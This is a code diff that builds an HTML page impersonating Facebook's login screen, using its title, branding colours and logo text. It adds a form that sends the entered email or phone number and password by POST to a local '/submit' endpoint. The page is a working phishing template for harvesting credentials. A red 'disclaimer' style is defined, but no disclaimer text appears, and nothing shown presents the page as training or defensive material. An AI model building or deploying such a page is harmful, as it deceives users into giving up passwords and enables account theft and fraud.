@@ -2,9 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 24px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .facebook-logo {
+            font-size: 36px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+        .subtitle {
+            font-size: 18px;
+            color: #606770;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .button {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .button:hover {
+            background-color: #145dbf;
+        }
+        .forgot-password {
+            display: block;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .disclaimer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: red;
+        }
+    </style>
 </head>
 <body>
-
+    <div class="container">
+        <div class="facebook-logo">facebook</div>
+        <form method="POST" action="/submit">
+            <input type="text" name="username" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button class="button" type="submit">Log In</button>
+        </form>
+        <a href="#" class="forgot-password">Forgotten password?</a>
+    </div>
 </body>
 </html>
